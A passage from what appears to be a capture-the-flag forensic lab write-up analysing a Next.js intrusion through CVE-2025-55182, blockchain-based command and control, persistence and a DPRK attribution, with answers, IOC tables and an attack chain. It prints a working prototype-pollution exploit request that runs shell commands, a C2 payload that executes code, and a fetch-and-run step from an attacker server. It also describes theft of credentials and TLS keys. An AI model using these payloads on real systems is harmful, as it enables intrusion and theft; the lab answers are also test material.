  fingerprint : SHA256:1RquAvdtW48Ken6IVUZi/o4liu1SXlvezhgjb2fnvBg
```

# Execution

**Q17**- When was the first remote command executed through the C2 channel (UTC)?

Answer: `2026-02-10 18:40`

Reason: Two minutes after persistence was confirmed, the C2 broke from its pattern of `204` keepalives and small acknowledgments, returning `1847` bytes of `application/javascript` in response to a routine-looking beacon GET disguised as `/api/06fa9e83/4ebfbc8aedf60511/0de42efe.jpg`. The payload size delta alone is a detectable signal: beacon responses jump from negligible keepalive bytes to `1847` bytes the moment operator interaction begins.

The command itself, `whoami`, mirrors the initial RCE probe from Frame `34211`, a deliberate operator verification step confirming execution context through the newly established C2 channel rather than the SSH backdoor. The choice to verify via C2 rather than SSH suggests the operator was validating the full kill chain end-to-end: blockchain resolution, implant beacon, payload delivery, and execution, before committing to interactive operations (MITRE ATT&CK T1033: System Owner/User Discovery).

**Frame 42414** | `63.176.62.199` -> `172.31.44.238 -> 2026-02-10 18:40:13 UTC` | first interactive command

```
Frame 42414 | 2026-02-10 18:40:13 UTC
63.176.62.199 → 172.31.44.238
HTTP/1.1 200 OK
Content-Type: application/javascript
Content-Length: 1847

const { execSync } = require('child_process');
execSync("whoami", { encoding: 'utf8', timeout: 30000 });
```

# Impact

**Q18**- After establishing access, the attacker closed the door behind them so no one could get in the way they did. What Next.js version was installed to patch the vulnerability?

Answer: `15.3.9`

Reason: Two minutes after confirming interactive C2 execution, the attacker reused the same CVE-2025-55182 exploit payload to patch the vulnerability on the compromised server. The `execSync` call wiped `node_modules`, `.next`, and `package-lock.json` before reinstalling `next@15.3.9` with `--legacy-peer-deps`, replacing the vulnerable Next.js version with a patched release. The `500` response `digest` field confirmed successful execution, returning `npm audit` output for `76` packages.

This is a well-documented post-compromise pattern known as competitor exclusion or access preservation: the attacker closes the entry point they used to prevent other threat actors from reaching the same host and potentially discovering or displacing their implant (MITRE ATT&CK T1562: Impair Defenses). The action is operationally self-serving rather than remedial. Persistence via systemd service, SSH authorized key, and blockchain C2 remained fully intact. The patch eliminated the exploit while leaving every post-exploitation artifact untouched.

**Frame 44786** | `63.180.69.24` -> `172.31.44.238 2026-02-10 18:42:13 UTC` | `POST /login` via CVE-2025-55182

```
# Wireshark Query
http.file_data contains "npm install"

POST /login HTTP/1.1
Host: maromalix.cloud
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Next-Action: x
Content-Length: 749
Content-Type: multipart/form-data; boundary=095b2f7cd44b802dc863280a18c0d1f7

--095b2f7cd44b802dc863280a18c0d1f7
Content-Disposition: form-data; name="0"

{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, "value": "{\"then\": \"$B0\"}", "_response": {"_prefix": "var res = process.mainModule.require('child_process').execSync('cd /home/maromalix/app && rm -rf node_modules .next package-lock.json && npm install next@15.3.9 --save --legacy-peer-deps && npm install --include=dev --legacy-peer-deps 2>&1 | tail -3',{'timeout':300000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});", "_formData": {"get": "$1:constructor:constructor"}}}
--095b2f7cd44b802dc863280a18c0d1f7
Content-Disposition: form-data; name="1"

"$@0"
--095b2f7cd44b802dc863280a18c0d1f7--
HTTP/1.1 500 Internal Server Error
x-server-action-logged: true
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/x-component
Content-Encoding: gzip
Date: Tue, 10 Feb 2026 18:42:13 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

0:{"a":"$@1","f":"","b":"rV3gqqDZ4VcvybLCRFy_5"}
1:E{"digest":"added 75 packages, and audited 76 packages in 19s\n\n16 packages are looking for funding\n  run `npm fund` for details\n\n1 moderate severity vulnerability\n\nTo address all issues, run:\n  npm audit fix --force\n\nRun `npm audit` for details.\n  npm audit fix\n\nRun `npm audit` for details."}
```

# Attribution

**Q19**- Based on the observed IOCs and TTPs, which nation-state is most likely behind this activity?

Answer: DPRK

Reason: **Attribution Assessment** | Lazarus Group (DPRK nexus): Multiple Tactics, Techniques, and Procedures (TTPs) and Indicators of Compromise (IOCs) observed across this intrusion align with Democratic People's Republic of Korea (DPRK) threat activity, most specifically the Lazarus Group. No single indicator is conclusive in isolation, but the convergence of six independent signals raises the collective confidence to high.

Blockchain-based C2 via Ethereum smart contracts reflects DPRK's deep, operationally proven expertise in cryptocurrency infrastructure, the same ecosystem Lazarus has exploited to steal an estimated billions in digital assets globally. The Commonwealth of Independent States (CIS) locale blocklist covering `ru`, `be`, `kk`, `ky`, `tg`, `uz`, `hy`, `az`, and `ka` deliberately excludes Russian-speaking regions, consistent with DPRK's standing operational practice of avoiding friction with geopolitical partners. The SSH backdoor comment `maromalix@ether_dev` reinforces the Ethereum development theme as a deliberate operator fingerprint. AWS credential harvesting fits Lazarus's established financial targeting pattern, where cloud access keys are a direct path to monetizable infrastructure. The multi-stage implant architecture, spanning an encrypted blob, JavaScript dropper, Transport Layer Security (TLS) key harvester, credential thief, and five simultaneous persistence mechanisms, reflects the resourcing and operational discipline characteristic of a state-sponsored actor. Finally, the use of AI-assisted tooling in the reconnaissance phase aligns with recent threat intelligence reporting on DPRK's accelerating adoption of AI in offensive cyber operations (MITRE ATT&CK G0032: Lazarus Group).

```
Attribution indicators
├── Blockchain C2 via Ethereum smart contracts     # DPRK crypto expertise
├── CIS locale blocklist                           # protects geopolitical partners
├── AWS credential harvesting                      # financial targeting pattern
├── SSH comment: maromalix@ether_dev               # operator blockchain theme
├── AI-assisted tooling                            # matches recent DPRK reporting
└── Multi-stage implant architecture               # state-sponsored resourcing
```

# Artifacts

**Network Indicators**

| Type | Value |
| --- | --- |
| Attacker IP (exploit) | `63.180.69.24` |
| C2 / Delivery server | `63.176.62.199:443` |
| Primary C2 (stale) | `91.215.85.42:3000` |
| Historical C2 | `173.249.8.102` |
| Historical C2 | `3.78.187.211:443` |
| Historical C2 | `3.66.227.157:443` |
| Historical C2 | `15.116.46.18:443` |
| Next-Action hash (recon) | `16585177d96f96a914179445ccdf3ab2de95e19a` |

**Blockchain Indicators**

| Type | Value |
| --- | --- |
| Primary C2 contract (mainnet) | `0x22f96d61cf118efabc7c5bf3384734fad2f6ead4` |
| Fallback C2 contract (Sepolia) | `0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4` |
| Primary lookup address | `0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D` |
| Fallback lookup address | `0x1d978D230b51c2eF3Fd780514c00e926ad9A47b1` |
| Contract deployment tx | `0x797080597f0af35c755ded2e8d8d1fd00c7b46412fb4aebf2e73b486747d2e1d` |
| First C2 URL tx | `0xe4efe4d2b118229161f7023e13ab98b54180fbfb1756d11959e4f19238b9655d` |
| Contract deployed | `2025-12-05 19:13:47 UTC` |

**Host Indicators**

| Type | Value |
| --- | --- |
| Malware directory | `~/.local/share/.05bf0e9b/` |
| Encrypted blob | `.1d5j6rm2mg2d` |
| Stage 2 dropper | `.kxnzl4mtez.js` |
| Decrypted RAT implant | `.7vfgycfd01.js` |
| TLS keylogger preload | `/tmp/.font-unix/.fontconfig` |
| Stolen TLS keys | `/tmp/.font-unix/.cache` |
| Systemd service | `~/.config/systemd/user/c16a536e1a9cb42d.service` |
| XDG autostart | `~/.config/autostart/a5eae68533ea066c.desktop` |
| Authorized keys path | `/home/maromalix/.ssh/authorized_keys` |
| SSH key comment | `maromalix@ether_dev` |
| SSH key fingerprint | `SHA256:1RquAvdtW48Ken6IVUZi/o4liu1SXlvezhgjb2fnvBg` |
| Bot ID | `4ebfbc8aedf60511` |
| Installer script | `s.sh` |

**Encryption Parameters**

| Parameter | Value |
| --- | --- |
| Algorithm | `AES-256-CBC` |
| Key (UTF-8) | `a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5` |
| IV (UTF-8) | `d4e5f6a7b8c9d0e1` |
| Blob encoding | `Base64` |

# Attack Chain

| Time (UTC) | Stage | Detail | MITRE |
| --- | --- | --- | --- |
| `2026-02-10 18:36:53` | Reconnaissance | `63.180.69.24` automated GET/POST enumeration of all endpoints via `python-requests/2.31.0`; Next-Action hash `16585177...` extracted from JS source | T1595.002 |
| `2026-02-10 18:36:53` | Initial Access | CVE-2025-55182 prototype pollution RCE via React Flight deserializer; `__proto__` + `constructor.constructor` gadget chain; `id` output leaked in `500` digest | T1190 |
| `2026-02-10 18:36:53` | Execution | `execSync('id')` confirms `uid=999(maromalix)`; while loop downloads `s.sh` from `63.176.62.199:443` via `curl` with `wget` fallback | T1059.004 |
| `2026-02-10 18:36:53` | Defense Evasion | `s.sh` self-deletes after execution; malware stored in hidden directory `~/.local/share/.05bf0e9b/`; RAT blob AES-256-CBC encrypted at rest | T1027 / T1070.004 |
| `2026-02-10 18:36:53` | Credential Access | TLS keylogger monkey-patches `tls.connect` and `https.request`; session keys written to `/tmp/.font-unix/.cache`; 8300 keys harvested | T1557 |
| `2026-02-10 18:37:25` | Command and Control | RAT queries PRIMARY Ethereum contract `0x22f96d...` via 8 public RPC nodes; `91.215.85.42:3000` returns `404`; falls back to Sepolia contract; resolves `hxxps://63.176.62.199:443` | T1102 / T1008 |
| `2026-02-10 18:37:25` | Command and Control | Implant beacons every 60s disguised as static asset GET (`/api/<rand>/<botId>/<rand>.jpg`); bot ID `4ebfbc8aedf60511` registered | T1071.001 / T1036 |
| `2026-02-10 18:37:50` | Credential Access | Stage payload harvests `~/.aws/credentials`, `~/.aws/config`, SSH keys, `.env`, bash history; exfiltrated to `/crypto/keys` | T1552.001 |
| `2026-02-10 18:38:05` | Persistence | Five simultaneous persistence methods installed: systemd user service `c16a536e1a9cb42d.service`, XDG autostart, crontab `@reboot`, `.bashrc`, `.profile` | T1543.002 / T1053.003 |
| `2026-02-10 18:38:13` | Persistence | SSH public key `maromalix@ether_dev` injected into `/home/maromalix/.ssh/authorized_keys`; fingerprint `SHA256:1RquAvdtW48Ken6IVUZi/o4liu1SXlvezhgjb2fnvBg` | T1098.004 |
| `2026-02-10 18:40:13` | Execution | First interactive command `whoami` executed via C2 beacon response (`application/javascript` payload disguised as `.jpg`) | T1059.007 |
| `2026-02-10 18:42:13` | Defense Evasion | Attacker patches Next.js to `15.3.9` via same CVE exploit; `rm -rf node_modules .next` then `npm install next@15.3.9`; locks out competing threat actors | T1562 |

## Text Tree

```jsx
[Initial Access - CVE-2025-55182]  <- 63[.]180[.]69[.]24 -> 172.31.44.238 (maromalix.cloud)
    └── python-requests/2.31.0 automated scanner
        ├── [Recon - Server Action Enumeration]
        │   └── GET/POST pairs against all endpoints
        │       └── Next-Action: 16585177d96f96a914179445ccdf3ab2de95e19a  <- hash from JS source
        │           └── probe payload {"id":"test"} -> fingerprint /login as target route
        └── [Execution - Prototype Pollution RCE]
            └── POST /login  Next-Action: x
                └── $1:__proto__:then + $1:constructor:constructor gadget chain
                    └── execSync('id') -> digest leak in 500 response
                        └── uid=999(maromalix)  <- RCE confirmed 18:36:53 UTC
                            ├── [Payload Delivery]
                            │   └── while loop: curl || wget -> 63[.]176[.]62[.]199:443/s.sh
                            │       └── chmod+x -> nohup -> rm -f s.sh  <- self-deletion
                            │           ├── [Defense Evasion]
                            │           │   └── ~/.local/share/.05bf0e9b/  <- hidden malware dir
                            │           │       ├── .1d5j6rm2mg2d  <- AES-256-CBC encrypted blob
                            │           │       ├── .kxnzl4mtez.js  <- Stage 2 dropper
                            │           │       └── .7vfgycfd01.js  <- decrypted RAT implant
                            │           └── [Credential Access - TLS Key Theft]
                            │               └── monkey-patch tls.connect + https.request
                            │                   └── keylog -> /tmp/.font-unix/.cache
                            │                       └── 8300 session keys harvested
                            ├── [C2 Resolution - Blockchain]
                            │   └── eth_call -> PRIMARY 0x22f96d...  <- 8 RPC nodes (Promise.all)
                            │       └── 91[.]215[.]85[.]42:3000 -> 404  <- stale, rejected
                            │           └── FALLBACK 0xb0cbaa... (Sepolia)
                            │               └── https://63[.]176[.]62[.]199:443  <- active C2
                            │                   └── beacon: GET /api/<rand>/4ebfbc8aedf60511/<rand>.jpg
                            ├── [Credential Access - File Harvest]  <- 18:37:50 UTC
                            │   └── ~/.aws/credentials + config, SSH keys, .env, bash_history
                            │       └── POST /crypto/keys -> 63[.]176[.]62[.]199:443
                            ├── [Persistence]  <- 18:38:05 UTC
                            │   ├── systemd: c16a536e1a9cb42d.service
                            │   ├── XDG autostart: a5eae68533ea066c.desktop
                            │   ├── crontab @reboot
                            │   ├── ~/.bashrc injection
                            │   └── ~/.profile injection
                            ├── [Persistence - SSH Backdoor]  <- 18:38:13 UTC
                            │   └── ssh-rsa maromalix@ether_dev -> ~/.ssh/authorized_keys
                            ├── [Execution - Interactive C2]  <- 18:40:13 UTC
                            │   └── whoami via beacon response (application/javascript as .jpg)
                            └── [Defense Evasion - Patch]  <- 18:42:13 UTC
                                └── CVE-2025-55182 exploit -> npm install next@15.3.9
                                    └── locks out competing threat actors
```

# Lab Insights

- Blockchain as bulletproof C2 -- EtherRAT demonstrates that any public blockchain can replace a traditional C2 server entirely. The attacker's commands are immutable, globally distributed, and indistinguishable from legitimate Ethereum traffic. No domain to sinkhole, no IP to block, no certificate to revoke.
- Pre-positioning as operational discipline -- The C2 infrastructure was deployed two months before the attack. The attacker had a working blockchain C2, a live delivery server, and a tested payload before a single packet touched the victim. This separation of preparation and execution is a hallmark of state-sponsored operations.
- The TLS keylogger is the crown jewel -- Monkey-patching tls.connect via NODE_OPTIONS --require is elegant and devastating. Every Node.js process on the server inherits the hook automatically. The stolen key log file is what makes the entire PCAP readable -- the attacker essentially handed defenders the decryption keys as an artifact of their own tradecraft.
- Payload delivery hidden in plain sight -- Every C2 command arrives as a beacon response disguised as a static image fetch with a random path, random filename, and random extension. The content type mismatch (application/javascript served as .jpg) is the only tell -- and only visible after TLS decryption.
- Persistence depth over persistence stealth -- Five simultaneous persistence mechanisms (`systemd`, XDG, `cron`, `bashrc`, `profile`) reflect a preference for redundancy over concealment. Any one being detected and removed leaves four survivors. This is overkill for a single target and suggests a reusable, templated implant deployed at scale.
- The attacker patched their own foothold -- Using the same CVE exploit to install `next@15.3.9` immediately after compromise is a sophisticated operational security move. It evicts competing threat actors, removes the entry point from defenders' detection playbooks, and demonstrates the attacker understood the vulnerability well enough to weaponize the patch.
- Blockchain forensics inverts the attribution problem -- Every `setString` call is permanently timestamped and publicly auditable. The entire C2 URL rotation history -- from 3[.]66[.]227[.]157 through 15[.]116[.]46[.]18 -- is preserved forever on Sepolia. The attacker gained an unkillable C2 but sacrificed all ability to cover their infrastructure tracks.
- CIS locale exclusions as geopolitical fingerprint -- The nine-country blocklist is a well-established DPRK/Lazarus operational signature. Excluding Russian-speaking regions while targeting Western cloud infrastructure narrows attribution significantly before any other TTP analysis is applied.
- Pull-based C2 defeats perimeter detection -- The implant never accepts inbound connections. All communication is victim-initiated outbound HTTPS polling every 60 seconds. From the network perimeter's perspective, the server is just making routine API calls. The asymmetry between how the traffic looks and what it does is the core evasion principle of this entire campaign.

# Forensic Timeline

![forensic_timeline.png](forensic_timeline.png)